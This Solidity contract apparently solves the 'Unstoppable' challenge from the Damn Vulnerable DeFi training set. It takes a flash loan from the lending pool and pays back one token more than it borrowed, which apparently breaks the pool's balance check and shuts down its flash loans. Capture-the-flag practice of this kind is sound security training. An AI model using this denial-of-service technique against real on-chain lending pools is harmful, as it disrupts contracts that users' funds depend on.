// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;
import "./ReceiverUnstoppable.sol";
import "./UnstoppableLender.sol";
import "./DamnValuableToken.sol";
import "hardhat/console.sol";

contract Exploit {
    ReceiverUnstoppable public immutable Receiver;
    UnstoppableLender public immutable Pool;
    DamnValuableToken public immutable Token;

    constructor(
        address _receiver,
        address _pool,
        address _token
    ) {
        Receiver = ReceiverUnstoppable(_receiver);
        Pool = UnstoppableLender(_pool);
        Token = DamnValuableToken(_token);
    }

    function CallFlashLoan() external {
        Pool.flashLoan(10);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        // Return all tokens + 1 to the pool

        require(IERC20(tokenAddress).transfer(msg.sender, amount + 1), "Transfer of tokens failed");
    }

    receive() external payable {}

    fallback() external {}
}
